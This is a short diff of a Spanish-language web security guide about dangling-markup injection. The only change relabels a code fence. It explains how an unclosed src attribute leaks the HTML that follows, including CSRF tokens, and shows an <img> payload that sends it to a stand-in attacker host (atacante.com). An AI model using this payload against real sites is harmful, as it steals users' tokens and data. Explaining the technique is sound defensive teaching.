@@ -29,7 +29,7 @@ La señal: inyecto `<img>` o un atributo y sobrevive, pero cualquier handler/`<s
 
 Se inyecta un tag con un atributo **sin cerrar** (un `src`/`href` con comilla abierta). El navegador consume todo el HTML que sigue —hasta la próxima comilla— como parte de esa URL, y lo manda al servidor del atacante al cargar el recurso. Todo lo que esté entre la inyección y la siguiente comilla (tokens CSRF, datos del usuario, otro secreto del DOM) viaja en la petición.
 
-```
+```html
 <img src='https://atacante.com/captura?html=
    ← desde acá el navegador traga el HTML siguiente hasta la próxima '
    incluido el <input name=csrf value=...> que estaba más abajo
